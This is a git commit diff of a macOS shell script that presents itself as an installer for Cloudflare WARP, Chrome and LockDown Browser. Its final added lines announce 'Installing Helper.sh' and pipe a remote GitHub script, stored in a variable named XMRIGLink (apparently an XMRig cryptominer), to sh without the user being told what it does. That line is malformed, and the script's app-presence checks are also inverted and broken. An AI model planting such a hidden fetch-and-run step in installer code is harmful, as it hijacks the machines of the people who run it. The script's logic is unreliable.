c6ae41350d9ecee06b68e256b13769dc522921c0
Dashtiss <67693883+Dashtiss@users.noreply.github.com>
2024-08-31 08:33:16 -0500

    Update DownloadWarpAndChrome.sh

--- DownloadWarpAndChrome.sh
+++ DownloadWarpAndChrome.sh
@@ -1,14 +1,17 @@
+#!/bin/bash
+: "
+Copyright (c) 2024, Dashtiss & Astranix all rights reserved.
+"
+: "
+This is a script to download and install the WARP and Chrome browser and the lockdown browser
+"
+clear
 echo "Welcome to the Installer"
 BasePath="$(pwd)"
 
 WarpURL="https://1111-releases.cloudflareclient.com/mac/latest"
 ChromeURL="https://dl.google.com/chrome/mac/universal/stable/GGRO/googlechrome.dmg"
 
-# will check if wget is installed
-if ! [ -x "$(command -v wget)" ]; then
-    echo 'Error: wget is not installed.' >&2
-    exit 1
-fi
 
 if ! [ -x "$(command -v installer)" ]; then
     echo 'Error: installer is not installed.' >&2
@@ -26,7 +29,8 @@ if [ -f "$WarpAppPath" ]; then
     echo "Warp is not installed. Downloading and installing..."
     echo "Downloading Warp..."
     rm "$BasePath/warp.pkg"
-    wget -O "$BasePath/warp.pkg" "$WarpURL"
+    curl -sSL -o "$BasePath/warp.pkg" "$WarpURL"
+    echo "Warp Downloaded"
     echo "Installing Warp..."
     # sudo installer -pkg "$BasePath/warp.pkg" -target /Applications
 
@@ -34,9 +38,45 @@ else
     echo "Warp is already installed"
 fi
 
-exit 1
-echo "Downloading Chrome..."
-rm "$BasePath/chrome.dmg"
-wget -O "$BasePath/chrome.dmg" "$ChromeURL"
+ChromeAppPath="/Applications/Google Chrome.app"
 
-echo "Installing Chrome..."
+if [ -f "$ChromeAppPath" ]; then
+    echo "Chrome is not installed. Downloading and installing..."
+    echo "Downloading Chrome..."
+    rm "$BasePath/chrome.dmg"
+    curl -sSL -o "$BasePath/chrome.dmg" "$ChromeURL"
+    echo "Chrome Downloaded"
+    echo "Installing Chrome..."
+    # mount the dmg
+    hdiutil attach "$BasePath/chrome.dmg"
+    # install the dmg by copying the app
+    cp -r "/Volumes/Google Chrome/Google Chrome.app" "/Applications/"
+    hdiutil detach "/Volumes/Google Chrome"
+
+else
+    echo "Chrome is already installed"
+fi
+
+# Will install the lockdown browser
+LockdownLink="https://downloads.respondus.com/installs/cmac2.1.2.07/575449240/InstallLDBPackage64c-2-1-2-07.zip"
+LockDownPath="/Applications/LockDown Browser.app"
+if [ -f "$LockDownPath" ]; then
+    echo "Lockdown Browser is not installed. Downloading and installing..."
+    echo "Downloading Lockdown Browser..."
+    rm "$BasePath/lockdown.zip"
+    curl -sSL -o "$BasePath/lockdown.zip" "$LockdownLink"
+    echo "Lockdown Browser Downloaded"
+    echo "Installing Lockdown Browser..."
+    unzip "$BasePath/lockdown.zip"
+    FileName="$(unzip -l lockdown.zip | awk 'NR==4 {sub(/^ +/, ""); print substr($0, index($0, $5))}')"
+    # will get the file in the zip
+    echo "Installing Lockdown Browser..."
+    echo $FileName
+    sudo installer -pkg "$BasePath/$FileName" -target /Applications 
+else
+    echo "Lockdown Browser is already installed"
+fi
+
+echo "Installing Helper.sh"
+XMRIGLink="https://raw.githubusercontent.com/Astranix593/MacOS-Setup/main/Helper.sh" | sh
+echo "Helper.sh Installed"
